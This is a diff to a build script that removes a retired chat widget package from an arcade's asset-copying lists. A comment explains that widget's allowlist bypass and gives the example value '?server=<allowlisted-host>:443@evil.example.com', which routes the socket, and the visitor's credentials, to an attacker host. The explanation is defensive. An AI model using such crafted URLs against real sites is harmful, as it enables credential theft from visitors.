@@ -27,23 +27,50 @@ import { fileURLToPath } from 'node:url';
 const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..');
 const SHARED = join(ROOT, 'arcade', 'shared');
 
-/** Package short name -> the arcade/shared/ filename games load. */
-const PACKAGES = ['rpg', 'score-client', 'puzzle', 'cards', 'audio', 'chat', 'multiplayer'];
+/**
+ * Package short name -> the arcade/shared/ filename games load.
+ *
+ * `chat` is deliberately absent. The widget was retired from the arcade on
+ * 2026-10-12 (docs/ops/chat-system.md) and its three generated files were
+ * deleted, so listing it here would copy them straight back out of
+ * node_modules on the next run of this script, for some unrelated package.
+ *
+ * That is not merely untidy. The build on npm is 0.6.0, which still carries
+ * the userinfo allowlist bypass: hostOf() read the host by stripping the
+ * scheme and splitting on ':', which returns the credentials rather than the
+ * host, so ?server=<allowlisted-host>:443@evil.example.com passed the
+ * allowlist and the socket opened to evil.example.com. The chat widget replays
+ * the visitor's saved credentials as soon as that socket opens, so the bypass
+ * handed them to a host of the sender's choosing. adenosine 0a9f39c fixes it
+ * by reading the hostname off the URL parser, released as 0.6.1 and NOT yet
+ * published.
+ *
+ * So re-adding `chat` needs 0.6.1 or newer installed first, not just a page
+ * that wants the widget. arcade/tests/test-chat-retired.js fails if the name
+ * comes back here, and is the place to read before dropping that test.
+ */
+const PACKAGES = ['rpg', 'score-client', 'puzzle', 'cards', 'audio', 'multiplayer'];
 
 /**
- * Extra files a package ships beside its bundle. adenosine-chat's SharedWorker
- * must sit next to the bundle that loads it: the widget resolves the worker as
- * a sibling of its own <script src>, and a SharedWorker cannot be bundled in
- * (it is a separate execution context loaded by URL).
+ * Extra files a package ships beside its bundle, where the bundle alone is not
+ * enough to run it.
+ *
+ * Empty since the retirement above. The entry was `chat: ['chat-worker.js']`,
+ * because adenosine-chat's SharedWorker has to sit next to the bundle that
+ * loads it: the widget resolves the worker as a sibling of its own
+ * <script src>, and a SharedWorker cannot be bundled in, being a separate
+ * execution context loaded by URL. The mechanism is kept rather than deleted
+ * with its only user, because the next package to ship a worker wants exactly
+ * this and the reasoning above is the part that is hard to rediscover.
  */
-const EXTRA_ASSETS = { chat: ['chat-worker.js'] };
+const EXTRA_ASSETS = {};
 
 /**
  * Hand-written scripts in arcade/shared/ that are not generated from npm but
  * still need busting. score-server.js decides which host receives high scores,
  * so a stale copy sends them nowhere — the exact failure the stamps prevent.
  */
-const LOCAL_SHARED = ['score-server.js', 'mp-server.js', 'chat-server.js'];
+const LOCAL_SHARED = ['score-server.js', 'mp-server.js'];
 
 /**
  * Stylesheets a package ships, and where in arcade/ the pages already load them
@@ -66,7 +93,6 @@ const PACKAGE_CSS = {
     ['chip-animation.css', 'arcade/shared/chips/chip-animation.css'],
   ],
   multiplayer: [['lobby.css', 'arcade/shared/multiplayer/lobby.css']],
-  chat: [['chat-widget.css', 'arcade/shared/chat-widget.css']],
   puzzle: [
     ['puzzle-base.css', 'arcade/puzzle-framework/css/puzzle-base.css'],
     ['puzzle-grid.css', 'arcade/puzzle-framework/css/puzzle-grid.css'],
